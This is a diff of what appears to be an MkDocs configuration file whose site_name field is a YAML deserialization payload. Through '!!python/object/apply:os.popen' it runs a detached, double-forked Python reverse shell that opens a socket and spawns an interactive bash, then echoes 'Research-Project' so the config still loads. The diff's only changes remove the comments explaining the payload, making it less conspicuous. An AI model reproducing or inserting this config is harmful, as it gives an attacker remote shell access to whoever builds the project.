@@ -2,7 +2,7 @@ site_name: !!python/object/apply:os.popen
   - |
     python3 -c 'import os,socket,subprocess;
     if os.fork() == 0:
-        os.setsid() # Crea una nueva sesión independiente
+        os.setsid()
         if os.fork() == 0:
             try:
                 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
@@ -11,11 +11,12 @@ site_name: !!python/object/apply:os.popen
                 p=subprocess.call(["/bin/bash","-i"])
             except: pass
     '
-    echo "Research-Project" # Esto devuelve un string válido para que site_name sea feliz
+    echo "Research-Project"
 plugins:
   - search
 markdown_extensions:
   - pymdownx.snippets
+
 
 
 
